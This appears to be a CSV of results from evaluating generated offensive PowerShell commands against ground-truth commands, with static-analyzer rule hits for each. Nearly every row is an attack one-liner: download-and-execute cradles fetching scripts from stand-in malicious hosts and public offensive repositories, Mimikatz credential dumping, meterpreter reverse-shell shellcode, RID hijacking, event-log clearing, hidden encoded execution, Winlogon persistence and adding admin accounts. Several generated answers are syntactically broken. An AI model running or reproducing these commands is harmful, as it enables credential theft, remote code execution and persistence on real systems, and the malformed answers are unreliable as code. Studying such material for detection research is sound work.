Answer,Ground Truth,ANSWER Rulename,ANSWER Message,ANSWER Severity,TRUTH Rulename,TRUTH Message,TRUTH Severity
Invoke-RIDHijacking -UseGuest -RID 1001 -Password Password1,Invoke-RIDHijacking -UseGuest -RID 1001 -Password Password1,[''],[''],[''],[''],[''],['']
Import-Module ${PSmodule} ; Invoke-DNSReverse -i ${PSmodule},Import-Module ${ps_module} ; Invoke-DNSExfiltrator -i ${ps_module} -d ${domain} -p ${password} -doh ${doh} -t ${time} ${encoding},[''],[''],[''],[''],[''],['']
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -File bad_script.ps1,powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -File malicious.ps1,[''],[''],[''],[''],[''],['']
Invoke-CompiledHTML -HHFilePath ${hh_file_path} -CHMFilePath ${chm_file_path},Invoke-ATHCompiledHelp -InfoTechStorageHandler ${infotech_storage_handler} -HHFilePath ${hh_file_path} -CHMFilePath ${chm_file_path},[''],[''],[''],[''],[''],['']
Invoke-BackdoorLNK -Path C:\Users\john\Desktop\Firefox.lnk -EncScript AA...,Invoke-BackdoorLNK -LNKPath C:\Users\john\Desktop\Firefox.lnk -CleanUp,[''],[''],[''],[''],[''],['']
Get-Eventlog -LogName 'System.Eventlog',$logs = Get-EventLog -List | ForEach-Object {$.Log} ; $logs | ForEach-Object {Clear-EventLog -LogName $ } ; Get-EventLog -list,[''],[''],[''],[''],[''],['']
PsExec ${input_file} -out ${output_file} -x 0x41,"cmd /c ""${ps_exec_location}"" -accepteula -i -s cmd.exe /c logman update trace ""${session}"" --p ""${provider}"" -ets",[''],[''],[''],[''],[''],['']
Invoke-CredentialPhishing -Verbose,Invoke-CredentialPhisher,[''],[''],[''],[''],[''],['']
"$source = ""\\${remote.file.path[filters(technique=T1005,max=5)]}"" ; $destination = ""C:\${temp.file.path[filters(max=2)]}"" ; Copy-Item -Path $source -Destination $dest","$x=""$env:temp\jxm.exe"";(New-Object System.Net.WebClient).DownloadFile('http://evilurl.com/')",['PSUseDeclaredVarsMoreThanAssignments '],"[""The variable 'destination' is assigned but never used. ""]",['Warning'],['PSUseDeclaredVarsMoreThanAssignments '],"[""The variable 'x' is assigned but never used. ""]",['Warning']
"powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command ""Invoke-Expression ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('base64 encoded string')))""","$payload = [System.Text.Encoding]::UTF8.GetBytes(""<malicious payload>""); $process = New-Object System.Diagnostics.Process; $process.StartInfo.FileName = ""powershell.exe""; $process.StartInfo.Arguments = ""-ExecutionPolicy Bypass -NoProfile -EncodedCommand "" + [Convert]::ToBase64String($payload); $process.Start()",[''],[''],[''],[''],[''],['']
Invoke-Command -ComputerName <target computer> -ScriptBlock {Invoke-Expression -Command <malicious code >},Invoke-Command -ComputerName <RemoteSystem> -ScriptBlock { <Powershell Command> },"['RedirectionNotSupported ', ' RedirectionNotSupported ', ' MissingFileSpecification ', ' PSAvoidUsingComputerNameHardcoded ', ' PSAvoidUsingInvokeExpression ']","[""The '<' operator is reserved for future use. "", "" The '<' operator is reserved for future use. "", ' Missing file specification after redirection operator. ', "" The ComputerName parameter of cmdlet 'Invoke-Command' is hardcoded. This will expose sensitive information about the system if the script is shared. "", ' Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. ']","['ParseError ', ' ParseError ', ' ParseError ', ' Error ', ' Warning']",['RedirectionNotSupported '],"[""The '<' operator is reserved for future use. ""]",['ParseError']
"Invoke-Expression -Command ""IEX (New-Object Net.WebClient).DownloadString('http://exploitingurl.com/exeKern32.ps1')""","Invoke-Expression -Command ""IEX(New-Object Net.WebClient).DownloadString('http://hacker.com/bad.ps1')""",['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning'],['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning']
Start-WebcamRecorder -RecordTime ${duration} -OutPath ${output_file},Start-WebcamRecorder -RecordTime 20 -OutPath 'C:\webcam.mov',[''],[''],[''],[''],[''],['']
"$url = ""http://malicious.site.com/malicious.ps1"";Invoke-Expression (New-Object System.Net.WebClient).DownloadString($url)","powershell -c ""IEX (New-Object Net.WebClient).DownloadString('http://maliciouswebsite.com/maliciousscript.ps1')""",['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning'],[''],[''],['']
Import-Module ${module_name} ; Invoke-ADFSCertify -Verbose -Threads 10,"Import-Module AADInternals -Force ; Export-AADIntADFSCertificates ; Get-ChildItem | Where-Object {$_ -like ""ADFS*""} ; Write-Host ""`nCertificates retrieved successfully""",[''],[''],[''],[''],[''],['']
powershell.exe -WindowStyle Hidden -EncodedCommand <base64 encoded payload>,powershell.exe -nop -w hidden -noni -enc <Base64 Encoded Command>,['RedirectionNotSupported '],"[""The '<' operator is reserved for future use. ""]",['ParseError'],['RedirectionNotSupported '],"[""The '<' operator is reserved for future use. ""]",['ParseError']
"Invoke-Expression -Command ""IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1')""",iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/dccuac.ps1'),['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning'],"['PSAvoidUsingInvokeExpression ', ' PSAvoidUsingCmdletAliases ']","['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. ', "" 'iex' is an alias of 'Invoke-Expression'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['Warning ', ' Warning']"
Get-ChildItem -Path ${alias} -Recurse | Out-Null,ls -recurse ; get-childitem -recurse ; gci -recurse,[''],[''],[''],"['PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ']","[""'ls' is an alias of 'Get-ChildItem'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" 'gci' is an alias of 'Get-ChildItem'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['Warning ', ' Warning']"
"powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command ""Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://example.com/script.ps1')""",powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command {iex (New-Object System.Net.WebClient).DownloadString('http://[malicious_website]/malicious_script.ps1')},[''],[''],[''],"['PSAvoidUsingInvokeExpression ', ' PSAvoidUsingCmdletAliases ']","['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. ', "" 'iex' is an alias of 'Invoke-Expression'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['Warning ', ' Warning']"
$stat = get-nbtstat -n,Exploit-Jenkins -Rhost 127.0.0.1 -Port 8080 -Cmd 'cmd /c netstat -an',['PSUseDeclaredVarsMoreThanAssignments '],"[""The variable 'stat' is assigned but never used. ""]",['Warning'],[''],[''],['']
Invoke-Command -ComputerName <target_host> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://malicious_site.com/malicious_script')},$Invoke = {IEX (New-Object Net.WebClient).DownloadString('http://malicious.url/malicious_script.ps1')}; Invoke-Command -ScriptBlock $Invoke,"['RedirectionNotSupported ', ' PSAvoidUsingInvokeExpression ', ' PSAvoidUsingCmdletAliases ']","[""The '<' operator is reserved for future use. "", ' Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. ', "" 'IEX' is an alias of 'Invoke-Expression'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['ParseError ', ' Warning ', ' Warning']","['PSAvoidUsingInvokeExpression ', ' PSAvoidUsingCmdletAliases ']","['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. ', "" 'IEX' is an alias of 'Invoke-Expression'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['Warning ', ' Warning']"
"Invoke-WebRequest -Uri 'http://thr3atSystem.com'"" -OutFile 'C:\Users\Public\thr3atSystem.exe'; Invoke-Expression 'C:\Users\Public\thr3atSystem.exe'","Invoke-WebRequest ${pua_url} -OutFile ${pua_file} ; & ""${pua_file}""",['TerminatorExpectedAtEndOfString '],"['The string is missing the terminator: "". ']",['ParseError'],[''],[''],['']
"powershell.exe -ExecutionPolicy Bypass -NoProfile -Command ""Invoke-Mimikatz""","powershell -exec bypass -command ""Invoke-Mimikatz -DumpCreds""",[''],[''],[''],[''],[''],['']
Get-WmiObject win32_process | Out-Csv c:\temp\results.txt,"powershell.exe -c ""Get-WmiObject -class win32_operatingsystem | select -property * | export-csv msdebug.log""",['PSAvoidUsingWMICmdlet '],"[""File 'buffer.ps1' uses WMI cmdlet. For PowerShell 3.0 and above, use CIM cmdlet which perform the same tasks as the WMI cmdlets. The CIM cmdlets comply with WS-Management (WSMan) standards and with the Common Information Model (CIM) standard, which enables the cmdlets to use the same techniques to manage Windows computers and those running other operating systems. ""]",['Warning'],[''],[''],['']
"powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command ""Invoke-Expression (New-Object Net.WebClient).DownloadString('http://ghithub.com/badProject')""","powershell -ep bypass -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');""",[''],[''],[''],[''],[''],['']
Invoke-Command -ComputerName <remote_system_name> -ScriptBlock { <powershell_code> },Invoke-Command -ComputerName <hostname> -ScriptBlock { < code > },['RedirectionNotSupported '],"[""The '<' operator is reserved for future use. ""]",['ParseError'],"['RedirectionNotSupported ', ' MissingFileSpecification ']","[""The '<' operator is reserved for future use. "", ' Missing file specification after redirection operator. ']","['ParseError ', ' ParseError']"
"Invoke-Expression -Command ""IEX (New-Object Net.WebClient).DownloadString('http://exploitingurl.com/exeKern32.ps1')""","Invoke-Expression -Command ""IEX (New-Object Net.WebClient).DownloadString('http://badwebserver.com/SysWin.ps1')""",['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning'],['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning']
Invoke-ATHHTMLApplication -FilePath ${file_path} -ScriptEngine ${script_engine} -AsLocalUNCPath -SimulateLateralMovement -MSHTAFilePath ${mshta_file_path},Invoke-ATHHTMLApplication -HTAFilePath ${hta_file_path} -ScriptEngine ${script_engine} -SimulateUserDoubleClick,[''],[''],[''],[''],[''],['']
"$url = ""http://sospiciousurl.org/malware.exe""; ; $localpath = ""C:\Windows\Temp\malware.exe""; ; Copy-Item -Path $url -Destination $env:TEMP\malware.exe",Invoke-WebRequest -Url http://malicious-server.com/malicious-file.exe -OutFile C:\malicious-file.exe,['PSUseDeclaredVarsMoreThanAssignments '],"[""The variable 'localpath' is assigned but never used. ""]",['Warning'],[''],[''],['']
Invoke-RIDHijacking -User alice -RID 500,Invoke-RIDHijacking -User alice -RID 500,[''],[''],[''],[''],[''],['']
"$psbypass = [System.Text.Encoding]::Unicode.GetBytes(""Invoke-Mimikatz -DumpCreds"")","$Bypass = New-Object System.Management.Automation.PSBypass; $Bypass.AddScript(""Invoke-Mimikatz -DumpCreds""); $Bypass.Invoke()",['PSUseDeclaredVarsMoreThanAssignments '],"[""The variable 'psbypass' is assigned but never used. ""]",['Warning'],[''],[''],['']
"powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command ""Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious-url')""","powershell.exe -nop -w hidden -c ""IEX ((New-Object Net.WebClient).DownloadString('http://evilurl.com/evil.ps1'))"";",[''],[''],[''],[''],[''],['']
powershell.exe -ExecutionPolicy Bypass -File C:\script.ps1,"powershell.exe -ExecutionPolicy Bypass -NoProfile -File ""C:\Users\attacker\script.ps1""",[''],[''],[''],[''],[''],['']
"Invoke-Mimikatz -ExecutionPolicy Bypass -NoProfile -Command ""Invoke-Mimikatz""","powershell -ep bypass -c ""Invoke-Mimikatz""",[''],[''],[''],[''],[''],['']
"Invoke-Expression -Command ""IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1')""",IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1'),['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning'],"['PSAvoidUsingInvokeExpression ', ' PSAvoidUsingCmdletAliases ']","['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. ', "" 'IEX' is an alias of 'Invoke-Expression'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['Warning ', ' Warning']"
cd $env:temp ; .\kerbrute.exe bruteForce --dc ${DomainController} -d ${Domain} $env:temp\bruteForce.txt,cd $env:temp ; .\kerbrute.exe bruteforce --dc ${domain_controller} -d ${Domain} $env:temp\brute_force.txt,['PSAvoidUsingCmdletAliases '],"[""'cd' is an alias of 'Set-Location'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]",['Warning'],['PSAvoidUsingCmdletAliases '],"[""'cd' is an alias of 'Set-Location'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]",['Warning']
powershell.exe -ExecutionPolicy Bypass -File C:\script.ps1,powershell.exe -ExecutionPolicy Bypass -File sysWin.ps1,[''],[''],[''],[''],[''],['']
"$source = ""C:\windows;tds;tds.dit""; ; $destination = ""C:\windows\temp;tds.dit"" ; Copy-Item -Path $source -Destination $dest",Invoke-NinjaCopy -Path 'C:\windows\clrt\clrt.dit' -LocalDestination 'C:\windows\temp\clrt.dit',['PSUseDeclaredVarsMoreThanAssignments '],"[""The variable 'destination' is assigned but never used. ""]",['Warning'],[''],[''],['']
Invoke-Mimikatz -DumpCreds; Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.1.1 -Lport 443,Invoke-Mimikatz -DumpCreds; Invoke-Shellcode -Payload windows/meterpreter/reverse_tcp -Lhost 192.168.1.1 -Lport 443,[''],[''],[''],[''],[''],['']
"Start-Process ${nsudo_path} ; Start-Sleep -Second 5 ; Stop-Process -Name ""CMD""","Start-Process ${nsudo_path} -Argument ""-U:T -P:E cmd"" ; Start-Sleep -Second 5 ; Stop-Process -Name ""cmd"" -force -erroraction silentlycontinue",[''],[''],[''],[''],[''],['']
Invoke-Command -ComputerName 192.168.1.1 -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://malicious-site')},"$command = ""Invoke-Expression (New-Object Net.WebClient).DownloadString('http://maliciousurl.com/malicious.ps1')""; Invoke-Command -ScriptBlock { Invoke-Expression $using:command }","['PSAvoidUsingInvokeExpression ', ' PSAvoidUsingComputerNameHardcoded ', ' PSAvoidUsingCmdletAliases ']","['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. ', "" The ComputerName parameter of cmdlet 'Invoke-Command' is hardcoded. This will expose sensitive information about the system if the script is shared. "", "" 'IEX' is an alias of 'Invoke-Expression'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['Warning ', ' Error ', ' Warning']",['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning']
"Invoke-Expression -Command ""IEX (New-Object Net.WebClient).DownloadString('http://exploitingurl.com/exeKern32.ps1')""","Invoke-Expression -Command ""IEX (New-Object Net.WebClient).DownloadString('http://badwebserver.com/SysWin.ps1')""",['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning'],['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning']
"powershell.exe -ExecutionPolicy Bypass -NoProfile -Command ""Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://maliciousurl.com/malicious.ps1')""","powershell.exe -exec bypass -nop -c ""IEX (New-Object Net.WebClient).DownloadString('https://malicious-website.com/malicious.ps1')""",[''],[''],[''],[''],[''],['']
Get-BrowserInformation -Browser All -Datatype History -UserName Alice -SearchStrings 'twitter',Get-BrowserInformation -Browser All -Datatype History -UserName Luca -Search 'wikipedia',[''],[''],[''],[''],[''],['']
"powershell.exe -NoP -sta -NonI -W Hidden -Exec Bypass -Command ""Invoke-WebRequest -Uri 'http://evil-website.com/' | Invoke-Expression""",.\wifi.ps1 -Off,[''],[''],[''],[''],[''],['']
"powershell.exe -ExecutionPolicy Bypass -NoProfile -Command ""Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://maliciousurl.com/malicious.ps1')""","powershell.exe -ep bypass -nop -c ""IEX (New-Object Net.WebClient).DownloadString('http://exploitingurl.com/execKern.ps1')""",[''],[''],[''],[''],[''],['']
"powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command ""Invoke-Expression (New-Object Net.WebClient).DownloadString('http://maliciousurl.com')""",powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command {Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious-server.com/malicious-script.ps1')},[''],[''],[''],['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning']
Compress-Archive -Path ${git_dir} -DestinationPath ${output_file} -Force,tar -czf ${host.dir.git}.tar.gz -C ${host.dir.git} *; Write-Host ${host.dir.git}.tar.gz; exit 0;,[''],[''],[''],[''],[''],['']
"Get-Content c:\ -Include *pass*.txt,*pass*.xml,*pass*.ini,*pass*.xlsx,*cred*,*vnc*,*.config*,*accounts* -File -Recurse -EA SilentlyContinue","Get-Content computers.txt | Get-WinUpdates | Format-Table PC,Date,Operation,Status,Title,KB,PC -Wrap -auto",[''],[''],[''],[''],[''],['']
"powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command ""Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://raw.githubusercontent.com/S3cur3Th1sSh1t/Invoke-Expression/master/obfuscatedps/DumpWCM.ps1')""",powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'),[''],[''],[''],[''],[''],['']
netsh interface portproxy add v4tov4 listenport=${listenport} connectport=${connectport} connectaddress=${connectaddress},netsh interface portproxy add v4tov4 listenport=${listen_port} connectport=${connect_port} connectaddress=${connect_address},[''],[''],[''],[''],[''],['']
$env:COR_ENABLE_PROFILING = 1 ; $env:COR_PROFILER = '${clsid_guid}' ; $env:COR_PROFILER_PATH = '${file_name}' ; POWERSHELL -c '${clsid_guid}',$env:COR_ENABLE_PROFILING = 1 ; $env:COR_PROFILER = '${cls_guid}' ; $env:COR_PROFILER_PATH = '${filename}' ; POWERSHELL -c 'Start-Sleep 1',[''],[''],[''],[''],[''],['']
Invoke-RIDHijacking -User Joe -RID 500 -Password Password1 -Enable,Invoke-RIDHijacking -User alice -RID 500 -Password Password1 -Enable,[''],[''],[''],[''],[''],['']
Get-WmiObject -Class Win32_Group,Get-WMIObject Win32_Group,['PSAvoidUsingWMICmdlet '],"[""File 'buffer.ps1' uses WMI cmdlet. For PowerShell 3.0 and above, use CIM cmdlet which perform the same tasks as the WMI cmdlets. The CIM cmdlets comply with WS-Management (WSMan) standards and with the Common Information Model (CIM) standard, which enables the cmdlets to use the same techniques to manage Windows computers and those running other operating systems. ""]",['Warning'],['PSAvoidUsingWMICmdlet '],"[""File 'buffer.ps1' uses WMI cmdlet. For PowerShell 3.0 and above, use CIM cmdlet which perform the same tasks as the WMI cmdlets. The CIM cmdlets comply with WS-Management (WSMan) standards and with the Common Information Model (CIM) standard, which enables the cmdlets to use the same techniques to manage Windows computers and those running other operating systems. ""]",['Warning']
Get-Date -Format Format -CurrentDate,Get-Date -UFormat '+%Y-%m-%dT%H:%M:%SZ',[''],[''],[''],[''],[''],['']
"Invoke-Expression -Command ""& {$url = 'http://malicious.site/malicious_script.ps1'; Invoke-WebRequest -Uri $url -OutFile 'C:\Users\Public\malicious_script.ps1'; Invoke-Expression}""",python ${file_name} -i ${IP},['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning'],[''],[''],['']
powershell.exe -ExecutionPolicy Bypass -File C:\script.ps1,powershell.exe -ExecutionPolicy Bypass -File C:\Users\User\somecode.ps1,[''],[''],[''],[''],[''],['']
"$Execute =Execute -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command ""Invoke-WebRequest -Uri 'http://thr3atSystem.com'""",Invoke-WScriptBypass -payload 'powershell.exe -ep Bypass -WindowStyle Hidden -enc <base64>',['PSUseDeclaredVarsMoreThanAssignments '],"[""The variable 'Execute' is assigned but never used. ""]",['Warning'],[''],[''],['']
"$payload = [System.Text.Encoding]::Unicode.GetBytes(""Invoke-Mimikatz -DumpCreds"")","$payload = [System.Text.Encoding]::Unicode.GetBytes(""Invoke-Mimikatz"")",['PSUseDeclaredVarsMoreThanAssignments '],"[""The variable 'payload' is assigned but never used. ""]",['Warning'],['PSUseDeclaredVarsMoreThanAssignments '],"[""The variable 'payload' is assigned but never used. ""]",['Warning']
Invoke-TokenManipulation -CreateProcess 'cmd.exe' -ThreadId 323,Invoke-TokenManipulation -CreateProcess 'cmd.exe' -ThreadId 500,[''],[''],[''],[''],[''],['']
Invoke-Inveigh -Command 'net user Inveigh Spring2017 /add && net localgroup administrators Inveigh /add',./Inveigh.ps1;Invoke-Inveigh -IP 192.168.1.10,[''],[''],[''],[''],[''],['']
"Invoke-Expression -Command ""& {$url = 'http://host.com/malicious_script.ps1'; Invoke-WebRequest -Uri $url -OutFile 'C:\Users\Public\malicious_script.ps1'; Invoke-Expression}""",python ${filename} -i ${host_ip},['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning'],[''],[''],['']
"Invoke-Mimikatz -ExecutionPolicy Bypass -NoProfile -Command ""Invoke-Mimikatz""","powershell.exe -exec bypass -c ""Invoke-Mimikatz""",[''],[''],[''],[''],[''],['']
"Start-Process ${DirLister_Path} ; Start-Sleep -Seconds 4 ; Stop-Process -Name ""dir""","Start-Process ${dirlister_path} ; Start-Sleep -Second 4 ; Stop-Process -Name ""DirLister""",[''],[''],[''],[''],[''],['']
"Start-Process ${WebBrowserPassViewPath} ; Start-Sleep -Second 4 ; Stop-Process -Name ""WebBrowserPassView""","Start-Process ${webbrowserpassview_path} ; Start-Sleep -Second 4 ; Stop-Process -Name ""WebBrowserPassView""",[''],[''],[''],[''],[''],['']
Invoke-CompiledHelp -ScriptEngine ${script_engine} -InfoTechStorageHandler ${infotech_storage_handler} -TopicExtension ${topic_extension} -HHFilePath ${hh_file_path} -CHMFilePath ${chm_file_path},Invoke-ATHCompiledHelp -ExecuteShortcutCommand -InfoTechStorageHandler ${infotech_storage_handler} -TopicExtension ${topic_extension} -HHFilePath ${hh_file_path} -CHMFilePath ${chm_file_path},[''],[''],[''],[''],[''],['']
"Set-WmiObject -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command ""Get-WmiObject -ClassName win32_operatingsystem | select * | more",$ElevatedOptions = New-ElevatedPersistenceOption -PermanentWMI -Daily -At '3 PM',['TerminatorExpectedAtEndOfString '],"['The string is missing the terminator: "". ']",['ParseError'],['PSUseDeclaredVarsMoreThanAssignments '],"[""The variable 'ElevatedOptions' is assigned but never used. ""]",['Warning']
"Invoke-Expression -Command ""IEX (New-Object Net.WebClient).DownloadString('http://heavy.site.com/heavy_code.ps1')""","$payload = 'IEX (New-Object Net.WebClient).DownloadString(""http://somesurl.com/juve.ps1"")'; Invoke-Expression $payload",['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning'],['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning']
get-wmiObject -class Win32_UserAccount,Get-WmiObject -Class Win32_UserAccount,['PSAvoidUsingWMICmdlet '],"[""File 'buffer.ps1' uses WMI cmdlet. For PowerShell 3.0 and above, use CIM cmdlet which perform the same tasks as the WMI cmdlets. The CIM cmdlets comply with WS-Management (WSMan) standards and with the Common Information Model (CIM) standard, which enables the cmdlets to use the same techniques to manage Windows computers and those running other operating systems. ""]",['Warning'],['PSAvoidUsingWMICmdlet '],"[""File 'buffer.ps1' uses WMI cmdlet. For PowerShell 3.0 and above, use CIM cmdlet which perform the same tasks as the WMI cmdlets. The CIM cmdlets comply with WS-Management (WSMan) standards and with the Common Information Model (CIM) standard, which enables the cmdlets to use the same techniques to manage Windows computers and those running other operating systems. ""]",['Warning']
Invoke-Mimikatz -DumpCreds; Invoke-Shellcode -TemplatePE -AsLocalUNCPath -MSHTAFilePath ${mshta_file_path},Invoke-Mimikatz -DumpCreds; Invoke-Shellcode -Payload windows/meterpreter/reverse_tcp -Lhost 10.0.0.1 -Lport 443; Invoke-C,[''],[''],[''],[''],[''],['']
Get-IndexedItem -filter stingray -path OneIndex14:// -recurse,"Get-IndexedItem -Filter Contains(*,'Stingray'), kind = 'picture', keywords='portfolio'",[''],[''],[''],['MissingArgument '],['Missing argument in parameter list. '],['ParseError']
$ErrorActionPreference = Get-Execute -ErrorAction Stop -Verbose,$ScriptBlockLoggingPreference='SilentlyContinue'; $ErrorActionPreference='SilentlyContinue'; $VerbosePreference='SilentlyContinue'; Invoke-SomeCmdlet -Parameter1 Value1 -Parameter2 Value2,[''],[''],[''],['PSUseDeclaredVarsMoreThanAssignments '],"[""The variable 'ScriptBlockLoggingPreference' is assigned but never used. ""]",['Warning']
"Invoke-Shellcode -Shellcode @(0xC7,0xE9)","Invoke-Shellcode -Shellcode @(0xE9,0x90,0x83)",[''],[''],[''],[''],[''],['']
"powershell.exe -nop -exec bypass -c ""IEX (New-Object Net.WebClient).DownloadString('http://exploitingurl.com/exeKern32.ps1')""",powershell.exe -NoP -NonI -W Hidden -Exec Bypass  IEX (New-Object Net.WebClient).DownloadString('http://site.com/code'),[''],[''],[''],[''],[''],['']
Invoke-HTMLApplication -ScriptEngine ${script_engine} -InlineProtocolHandler ${protocol_handler} -UseHost -MSHTAFilePath ${mshta_file_path},Invoke-ATHHTMLApplication -ScriptEngine ${script_engine} -InlineProtocolHandler ${protocol_handler} -UseRundll32 -Rundll32FilePath ${rundll32_file_path},[''],[''],[''],[''],[''],['']
Invoke-ATHCompression -FilePath ${file_path} -XML_Payload ${xml_payload},"${mwcpath}\${mwcname} ""${xml_payload}"" output.txt",[''],[''],[''],['UnexpectedToken '],"[""Unexpected token '\\${mwcname}' in expression or statement. ""]",['ParseError']
"powershell.exe -nop -exec bypass -c ""IEX (New-Object Net.WebClient).DownloadString('http://exploitingurl.com/exeKern32.ps1')""","powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command ""IEX (Invoke-WebRequest -Uri 'http://HeavySite.com/script.ps1').Content""",[''],[''],[''],[''],[''],['']
net use \\${remote.host.fqdn}\C$ /user:${domain.user.name} ${domain.user.password},net view \\${remote.host.fqdn} /all,[''],[''],[''],[''],[''],['']
"Set-ItemProperty ""HKLM:\SOFTWARE\Microsoft\Winlogon"" -Name Winlogon -Value ""${value}""","Set-ItemProperty ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"" ""Shell"" ""explorer.exe, ${binaryToExec}"" -Force",[''],[''],[''],['PSAvoidUsingPositionalParameters '],"[""Cmdlet 'Set-ItemProperty' has positional parameter. Please use named parameters instead of positional parameters when calling a command. ""]",['Information']
Invoke-Command -ComputerName <target> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://example.com/sysHack.ps1')},Invoke-Command -ComputerName <target> -ScriptBlock { Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil-web.site/superbad.ps1') },"['RedirectionNotSupported ', ' PSAvoidUsingInvokeExpression ', ' PSAvoidUsingCmdletAliases ']","[""The '<' operator is reserved for future use. "", ' Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. ', "" 'IEX' is an alias of 'Invoke-Expression'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['ParseError ', ' Warning ', ' Warning']","['RedirectionNotSupported ', ' PSAvoidUsingInvokeExpression ']","[""The '<' operator is reserved for future use. "", ' Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. ']","['ParseError ', ' Warning']"
gpresult /R,dir,[''],[''],[''],['PSAvoidUsingCmdletAliases '],"[""'dir' is an alias of 'Get-ChildItem'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]",['Warning']
